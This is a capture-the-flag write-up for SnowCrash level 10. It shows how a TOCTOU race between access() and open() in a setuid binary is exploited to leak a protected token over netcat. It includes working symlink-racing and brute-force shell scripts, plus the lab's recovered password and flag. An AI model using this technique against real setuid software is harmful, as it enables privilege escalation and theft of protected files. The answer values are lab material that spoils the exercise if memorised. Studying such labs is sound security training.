# LEVEL 10: Exploiting a Race Condition

## Goal
Retrieve the content of the `token` file by exploiting a race condition vulnerability in the `level10` binary.
## Steps

## I - Initial context
1. **Directory Contents:**  
    In our home directory, we have one suid/guid executable with extended permissions, and one token file:

    ```bash
    level10@SnowCrash:~$ ls -l
    total 16
    -rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
    -rw-------  1 flag10 flag10     26 Mar  5  2016 token
    ```
2. **Testing the binary:**  
    When we run the executable, it expects a file to send to the host.

    ```bash
    level10@SnowCrash:~$ ./level10 token
    ./level10 file host
        sends file to host if you have access to it
    ```

Thus, we have two tasks: escalating privileges to access the file and identifying which port to listen on to enable the file transfer.

## II - Successfully running the binary `level10`
1. **Testing the binary:**  
    If we run the executable with a file to which we have access, for example `/tmp/test`, that we created beforehand, and a host such as `localhost`:

    ``` bash
    level10@SnowCrash:~$ ./level10 /tmp/test localhost
    Connecting to localhost:6969 .. Unable to connect to host localhost
    ```
    We understand that the program tries to connect to port `6969`.  

2. **Listening on port `6969`**  
    The first step is to listen on port `6969`:
    ```bash
    level10@SnowCrash:~$ nc -lk 6969
    <hanging prompt>
    ```
    - `nc` Calls netcat to listen on a port.
    - `-lk` This option makes netcat listen continuously on the specified port.
3. **Tranferring a file we own**  
    We can connect to the machine on another shell through ssh and try executing `level10` with the following arguments:  

    - `/tmp/test` in which we previously wrote something using the command `echo "something" > /tmp/test`.
    - the SnowCrash VM's IP address.
    ```bash
    level10@SnowCrash:~$ ./level10 /tmp/test 192.168.1.14
    Connecting to 192.168.1.14:6969 .. Connected! 
    Sending file .. wrote file!
    ```
    In the other window listening on port 6969 we can read :
    ```bash
    level10@SnowCrash:~$ nc -lk 6969
    .*( )*. 
    something
    <hanging prompt>
    ```
    We have successfully transferred a file that we own.  

## III - Exploiting the vulnerability
Now we need to trick the `level10` binary into sending the content of the `token` file, which we do not own.  
Unfortunately, simply creating a symlink as we did in **level08** does not seem to work :
```bash
level10@SnowCrash:~$ ln -s token /tmp/myfile
level10@SnowCrash:~$ ./level10 /tmp/myfile 192.168.1.14
You don't have access to /tmp/myfile
```
1. **Finding a vulnerability using GDB:**  
    We run the gdb debugger to better understand how the `level10` program works:
    ```bash
    level10@SnowCrash:~$ gdb level10
    (...)
    (gdb) disassemble main
    Dump of assembler code for function main:
    0x080486d4 <+0>:	push   %ebp
    0x080486d5 <+1>:	mov    %esp,%ebp
    0x080486d7 <+3>:	and    $0xfffffff0,%esp
    0x080486da <+6>:	sub    $0x1050,%esp
    0x080486e0 <+12>:	mov    0xc(%ebp),%eax
    0x080486e3 <+15>:	mov    %eax,0x1c(%esp)
    0x080486e7 <+19>:	mov    %gs:0x14,%eax
    0x080486ed <+25>:	mov    %eax,0x104c(%esp)
    0x080486f4 <+32>:	xor    %eax,%eax
    0x080486f6 <+34>:	cmpl   $0x2,0x8(%ebp)
    0x080486fa <+38>:	jg     0x804871f <main+75>
    0x080486fc <+40>:	mov    0x1c(%esp),%eax
    0x08048700 <+44>:	mov    (%eax),%edx
    0x08048702 <+46>:	mov    $0x8048a40,%eax
    0x08048707 <+51>:	mov    %edx,0x4(%esp)
    0x0804870b <+55>:	mov    %eax,(%esp)
    0x0804870e <+58>:	call   0x8048520 <printf@plt>
    0x08048713 <+63>:	movl   $0x1,(%esp)
    0x0804871a <+70>:	call   0x8048590 <exit@plt>
    0x0804871f <+75>:	mov    0x1c(%esp),%eax
    0x08048723 <+79>:	mov    0x4(%eax),%eax
    0x08048726 <+82>:	mov    %eax,0x28(%esp)
    0x0804872a <+86>:	mov    0x1c(%esp),%eax
    0x0804872e <+90>:	mov    0x8(%eax),%eax
    0x08048731 <+93>:	mov    %eax,0x2c(%esp)
    0x08048735 <+97>:	mov    0x1c(%esp),%eax
    0x08048739 <+101>:	add    $0x4,%eax
    0x0804873c <+104>:	mov    (%eax),%eax
    0x0804873e <+106>:	movl   $0x4,0x4(%esp)
    0x08048746 <+114>:	mov    %eax,(%esp)
    0x08048749 <+117>:	call   0x80485e0 <access@plt>
    0x0804874e <+122>:	test   %eax,%eax
    0x08048750 <+124>:	jne    0x8048940 <main+620>
    0x08048756 <+130>:	mov    $0x8048a7b,%eax
    0x0804875b <+135>:	mov    0x2c(%esp),%edx
    0x0804875f <+139>:	mov    %edx,0x4(%esp)
    0x08048763 <+143>:	mov    %eax,(%esp)
    0x08048766 <+146>:	call   0x8048520 <printf@plt>
   (...)
    ```
    We see that one of its first actions is to call the C function `access()`, which checks file permissions against our user ID.

    By reading the manual for the `access()` system call, we find indications of a potential exploit :  
            
        Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.

2. **Understanding how to exploit the vulnerability:**   
    Here is how and why the vulnerability is exploitable:
    - First, create a fake token file to which you have full access rights.
    - Then, run a script that creates a `symlink` which continuously alternates between pointing to your fake token file and the real token file.
    - Finally, run another script that continuously executes the `level10` binary with the `symlink` as its argument. 
    - The steps above allow the following scenario to occur at least once:  
    `level10` is executed | the `symlink` points towards your fake token on which you have access | the `access()` system call authorizes you to continue executing the program | the `symlink` points towards the real `token` | the program opens the real `token`. 

3. **Exploiting the vulnerability:**  
    First, let's create a file that will act as a fake token to trick the program :
    ```bash
    level10@SnowCrash:~$ echo "Fake token" > /tmp/faketoken
    ```
    Then, in order to exploit the vulnerability, we have to write the script that will alternatively link `/tmp/link` to `/tmp/faketoken` and `/home/user/level10/token`:
    ```bash
    #!/bin/sh
    while true
    do
        echo "MY LINK"
        ln -sf /tmp/faketoken /tmp/link
        echo "TOKEN LINK"
        ln -sf /home/user/level10/token /tmp/link
    done
    ```
    We can upload this script in `/tmp` using this command in the shell :
    ```bash
    scp -P 4242 ./level10/ressources/linker.sh  level10@192.168.1.14:/tmp/.
    ```
    We grant it execution rights with the command:
    ```bash
    chmod +x /tmp/linker.sh
    ```
    In order to time the execution of the binary `level10` and the correct linking, we can write a `bruteforce.sh` script that will execute `level10` continuously :
    ```bash
    #!/bin/bash

    while true; do
        /home/user/level10/level10 /tmp/link 192.168.1.14 ;
    done
    ```
    Using the same method as before, we can upload this script in `/tmp` using this command in the shell :
    ```bash
    scp -P 4242 ./level10/ressources/bruteforce.sh  level10@192.168.1.14:/tmp/.
    ```
    We give it execution rights with the command:
    ```bash
    chmod +x /tmp/bruteforce.sh
    ```
    Finally, run the scripts while listening on port 6969, each in a different shell window connected to `level10`:
    - In the shell where we run `linker.sh` :
        ```bash
        cd /tmp
        ./linker.sh
        ```
        Will show:
        ```bash
        MY LINK
        FAKE TOKEN
        MY LINK
        (...)
        ```
    - In the shell where we run `bruteforce.sh` :
        ```bash
        cd /tmp
        ./bruteforce.sh
        ```
        will show:
        ```bash
        Connecting to 192.168.1.14:6969 .. Connected!
        Sending file .. wrote file!
        You don't have access to /tmp/link
        Connecting to 192.168.1.14:6969 .. Connected!
        Sending file .. wrote file!
        You don't have access to /tmp/link
        (...)
        ```
    - On the one listening to port6969:
        ```bash
        nc -lk 6969
        ```
        will show:
        ```bash
        level10@SnowCrash:~$ nc -lk 6969
        .*( )*.
        woupa2yuojeeaaed06riuj63c
        .*( )*.
        Fake token
        .*( )*.
        (...)
        ```
    The password for the user flag10 is : `woupa2yuojeeaaed06riuj63c`

4. **Retrieving the flag**  
    To retrieve the flag, the session has to switch to user `flag10`:  
    
    ```bash 
    su flag10
    ```
    Output:
    ```bash
    Password: 
    ```
    The password  `woupa2yuojeeaaed06riuj63c` is entered and the session switches to flag10.  
    To retrieve the flag the command `getflag` is used:   
    Output:
    ```bash
    Check flag.Here is your token : feulo4b72j7edeahuete3no7c
    ```